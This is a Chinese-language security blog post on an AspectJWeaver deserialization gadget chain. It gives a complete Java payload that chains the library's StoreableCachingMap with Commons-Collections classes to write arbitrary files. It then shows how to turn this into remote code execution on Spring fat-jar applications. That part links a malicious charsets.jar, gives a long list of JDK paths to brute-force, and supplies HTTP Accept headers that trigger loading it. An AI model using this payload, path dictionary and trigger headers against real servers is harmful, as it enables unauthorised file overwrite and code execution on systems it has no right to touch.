---
title: "AspectJWeaver反序列化写文件"
onlyTitle: true
date: 2024-12-19 11:19:21
categories:
- java
- 框架漏洞
tags:
- AspectJWeaver
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8123.png
---



```xml
<dependencies>
    <dependency>
        <groupId>org.aspectj</groupId>
        <artifactId>aspectjweaver</artifactId>
        <version>1.9.2</version>
     </dependency>
</dependencies>
```

由于是打cc，加个cc的依赖吧

```xml
<dependency>  
   <groupId>commons-collections</groupId>  
   <artifactId>commons-collections</artifactId>  
   <version>3.2.1</version>  
</dependency>
```

# AspectJWeaver链

AspectJWeaver 是 AspectJ 框架的一部分，是一个用于实现面向切面编程（[AOP](https://so.csdn.net/so/search?q=AOP&spm=1001.2101.3001.7020)）的工具。AspectJWeaver 提供了在 Java 程序中使用 AspectJ 的功能，并通过字节码操纵技术来织入切面代码到应用程序的目标类中。

## 任意文件写

漏洞点位于`org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap#writeToPath`

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211220438891.png)

拼接路径后写bytes到文件

查找用法，SimpleCache$StoreableCachingMap.put调用了writeToPath

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211220912293.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241211220857707.png)

能调用到put的地方就相当广了

而且StoreableCachingMap继承了HashMap，HashMap实现了Serializable，所以也是可序列化的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241212105901700.png)

拼一段CC5

```
BadAttributeValueExpException#readObject ->
TieMapEntry#toString -> getValue ->
LazyMap.get ->
SimpleCache$StoreableCachingMap.put
```

由于StoreableCachingMap是个内部类，用forName全限定名的方式反射获取

```java
public class writeToPath_withCC {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("cc6.ser"));
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class);
        constructor.setAccessible(true);
        HashMap storeableCachingMap = (HashMap) constructor.newInstance("./",1);
        storeableCachingMap.put("writeToPathFILE",code);
    }
}
```

多出了两个文件，其中writeToPathFILE就是我们指定写的文件

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20241212113635196.png)

完整payload：

```java
public class writeToPath_withCC {
    public static void main(String[] args) throws Exception {
        byte[] code = Files.readAllBytes(Paths.get("cc6.ser"));
        Class clazz = Class.forName("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap");
        Constructor constructor = clazz.getDeclaredConstructor(String.class,int.class);
        constructor.setAccessible(true);
        HashMap storeableCachingMap = (HashMap) constructor.newInstance("./",1);
//        storeableCachingMap.put("writeToPathFILE",code);
        LazyMap lazy = (LazyMap) LazyMap.decorate(storeableCachingMap, new ConstantTransformer(code));
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazy, "writeToPathFILE");
        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, tiedMapEntry);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}
```

但是我感觉很2B，明明CC都能RCE了，还借助这链写文件



## spring场景覆盖charsets.jar RCE

有任意文件写条件反射想到Spring FatJar覆盖charsets.jar去RCE吧

charsets.jar链接：

https://github.com/godownio/java_unserial_attackcode/blob/master/src/main/java/org/exploit/third/springBootFatjar/charsets.jar

在linux默认配置下，是不会加载charsets.jar包的。 默认 LANG=zh_CN.UTF-8，当把 LANG改为zh_CN.GBK时才可以加载charsets.jar

* tips：JDK HOME目录一般不是固定的，可以提前收集好JDK HOME的字典文件，爆破上传，如：

```shell
/usr/lib/jvm/jre/lib/
/usr/local/jdk/jre/lib/
/usr/local/openjdk-6/lib/
/usr/local/openjdk-7/lib/
/usr/local/openjdk-8/lib/
/usr/lib/jvm/java/jre/lib/
/usr/lib/jvm/jdk6/jre/lib/
/usr/lib/jvm/jdk7/jre/lib/
/usr/lib/jvm/jdk8/jre/lib/
/usr/lib/jvm/jdk-11.0.3/lib/
/usr/lib/jvm/jdk1.6/jre/lib/
/usr/lib/jvm/jdk1.7/jre/lib/
/usr/lib/jvm/jdk1.8/jre/lib/
/usr/local/openjdk6/jre/lib/
/usr/local/openjdk7/jre/lib/
/usr/local/openjdk8/jre/lib/
/usr/local/openjdk-6/jre/lib/
/usr/local/openjdk-7/jre/lib/
/usr/local/openjdk-8/jre/lib/
/mnt/jdk/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.6.0/jre/lib/
/usr/lib/jvm/jdk1.7.0/jre/lib/
/usr/lib/jvm/jdk1.8.0/jre/lib/
/usr/java/jdk1.8.0_111/jre/lib/
/usr/java/jdk1.8.0_121/jre/lib/
/usr/lib/jvm/java-6-oracle/lib/
/usr/lib/jvm/java-7-oracle/lib/
/usr/lib/jvm/java-8-oracle/lib/
/usr/lib/jvm/java-1.6.0/jre/lib/
/usr/lib/jvm/java-1.7.0/jre/lib/
/usr/lib/jvm/java-1.8.0/jre/lib/
/usr/lib/jvm/jdk1.7.0_51/jre/lib/
/usr/lib/jvm/jdk1.7.0_76/jre/lib/
/usr/lib/jvm/jdk1.8.0_60/jre/lib/
/usr/lib/jvm/jdk1.8.0_66/jre/lib/
/usr/lib/jvm/jdk1.8.0_74/jre/lib/
/usr/lib/jvm/jdk1.8.0_91/jre/lib/
/usr/lib/jvm/oracle_jdk6/jre/lib/
/usr/lib/jvm/oracle_jdk7/jre/lib/
/usr/lib/jvm/oracle_jdk8/jre/lib/
/usr/lib/jvm/jdk1.8.0_101/jre/lib/
/usr/lib/jvm/jdk1.8.0_102/jre/lib/
/usr/lib/jvm/jdk1.8.0_111/jre/lib/
/usr/lib/jvm/jdk1.8.0_131/jre/lib/
/usr/lib/jvm/jdk1.8.0_144/jre/lib/
/usr/lib/jvm/jdk1.8.0_151/jre/lib/
/usr/lib/jvm/jdk1.8.0_152/jre/lib/
/usr/lib/jvm/jdk1.8.0_161/jre/lib/
/usr/lib/jvm/jdk1.8.0_171/jre/lib/
/usr/lib/jvm/jdk1.8.0_172/jre/lib/
/usr/lib/jvm/jdk1.8.0_181/jre/lib/
/usr/lib/jvm/jdk1.8.0_191/jre/lib/
/usr/lib/jvm/jdk1.8.0_202/jre/lib/
/usr/lib/jvm/jdk8u202-b08/jre/lib/
/usr/lib/jvm/jre-6-oracle-x64/lib/
/usr/lib/jvm/jre-7-oracle-x64/lib/
/usr/lib/jvm/jre-8-oracle-x64/lib/
/usr/lib/jvm/zulu-6-amd64/jre/lib/
/usr/lib/jvm/zulu-7-amd64/jre/lib/
/usr/lib/jvm/zulu-8-amd64/jre/lib/
/usr/lib/jvm/java-6-oracle/jre/lib/
/usr/lib/jvm/java-7-oracle/jre/lib/
/usr/lib/jvm/java-8-oracle/jre/lib/
/usr/jdk/instances/jdk1.6.0/jre/lib/
/usr/jdk/instances/jdk1.7.0/jre/lib/
/usr/jdk/instances/jdk1.8.0/jre/lib/
/usr/lib/jvm/j2re1.6-oracle/jre/lib/
/usr/lib/jvm/j2re1.7-oracle/jre/lib/
/usr/lib/jvm/j2re1.8-oracle/jre/lib/
/usr/lib/jvm/java-1.6.0-sun/jre/lib/
/usr/lib/jvm/java-1.7.0-sun/jre/lib/
/usr/lib/jvm/java-1.8.0-sun/jre/lib/
/usr/lib/jvm/java-6-openjdk/jre/lib/
/usr/lib/jvm/java-7-openjdk/jre/lib/
/usr/lib/jvm/java-8-openjdk/jre/lib/
/usr/lib/jvm/j2sdk1.6-oracle/jre/lib/
/usr/lib/jvm/j2sdk1.7-oracle/jre/lib/
/usr/lib/jvm/j2sdk1.8-oracle/jre/lib/
/usr/lib/jvm/java-11-openjdk/jre/lib/
/usr/lib/jvm/java-12-openjdk/jre/lib/
/usr/lib/jvm/java-13-openjdk/jre/lib/
/usr/lib/jvm/java-1.6-openjdk/jre/lib/
/usr/lib/jvm/java-1.7-openjdk/jre/lib/
/usr/lib/jvm/java-1.8-openjdk/jre/lib/
/usr/lib/jvm/java-9-openjdk-amd64/lib/
/usr/lib/jvm/jdk-6-oracle-x64/jre/lib/
/usr/lib/jvm/jdk-7-oracle-x64/jre/lib/
/usr/lib/jvm/jdk-8-oracle-x64/jre/lib/
/usr/lib/jvm/jre-6-oracle-x64/jre/lib/
/usr/lib/jvm/jre-7-oracle-x64/jre/lib/
/usr/lib/jvm/jre-8-oracle-x64/jre/lib/
/usr/lib/jvm/java-10-openjdk-amd64/lib/
/usr/lib/jvm/java-11-openjdk-amd64/lib/
/usr/lib/jvm/java-1.11.0-openjdk/jre/lib/
/usr/lib/jvm/java-1.12.0-openjdk/jre/lib/
/usr/lib/jvm/java-6-openjdk-i386/jre/lib/
/usr/lib/jvm/java-6-sun-1.6.0.16/jre/lib/
/usr/lib/jvm/java-6-sun-1.6.0.20/jre/lib/
/usr/lib/jvm/java-7-openjdk-i386/jre/lib/
/usr/lib/jvm/java-8-openjdk-i386/jre/lib/
/usr/lib/jvm/java-6-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-7-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.6.0-oracle-x64/jre/lib/
/usr/lib/jvm/java-1.7.0-oracle-x64/jre/lib/
/usr/lib/jvm/java-1.8.0-oracle-x64/jre/lib/
/usr/lib/jvm/oracle-java6-jdk-amd64/jre/lib/
/usr/lib/jvm/oracle-java7-jdk-amd64/jre/lib/
/usr/lib/jvm/oracle-java8-jdk-amd64/jre/lib/
/usr/lib64/jvm/java-1.6.0-ibd-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.6.0-ibm-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.7.1-ibm-1.7.1/jre/lib/
/usr/lib/jvm/java-1.6.0-sun-1.6.0.11/jre/lib/
/usr/lib/jvm/java-1.6.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/jre-1.6.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/jre-1.7.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/jre-1.8.0-openjdk.x86_64/jre/lib/
/usr/lib/jvm/java-1.11.0-openjdk-amd64/jre/lib/
/usr/lib/jvm/jdk-8-oracle-arm-vfp-hflt/jre/lib/
/usr/lib64/jvm/java-1.6.0-openjdk-1.6.0/jre/lib/
/usr/lib64/jvm/java-1.7.0-openjdk-1.7.0/jre/lib/
/usr/lib64/jvm/java-1.8.0-openjdk-1.8.0/jre/lib/
/usr/lib/jvm/java-1.6.0-openjdk-1.6.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.8.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-amazon-corretto.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.0.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.45.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.65.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.75.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.79.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.91.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-3.b17.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-4.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-2.b14.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-11.b12.el7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-1.b13.el6_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.el7_1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.el6_7.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.102-1.b14.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-0.b15.el6_8.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-2.b15.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-0.b11.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-3.b12.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-3.b16.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.144-0.b01.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-5.b12.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-3.b14.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-3.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el6_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-1.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.amzn2.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-2.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.222.b10-0.el7_6.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-3.b13.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.el6_10.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.31-2.b13.5.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.65-2.b17.7.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.77-0.b03.9.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.101-2.6.6.1.el7_2.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.131-2.6.9.0.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.91-0.b14.10.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.141-2.6.10.1.el7_3.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.171-2.6.13.0.el7_4.x86_64/jre/lib/
/usr/lib/jvm/java-1.7.0-openjdk-1.7.0.191-2.6.15.4.el7_5.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.101-3.b13.24.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.111-1.b15.25.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.121-0.b13.29.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.131-2.b11.30.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.141-1.b16.32.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.151-1.b12.35.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.161-0.b14.36.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-7.b10.37.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.38.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.42.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.201.b09-0.43.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.212.b04-0.45.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.171-8.b10.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.181-8.b13.39.39.amzn1.x86_64/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el7_5.x86_64-debug/jre/lib/
/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.191.b12-0.el6_10.x86_64-debug/jre/lib/
```

用下面任意一个Accept去触发

```http
Accept: multipart/form-data;charset=IBM33722;
Accept: text/html;charset=IBM33722;
```

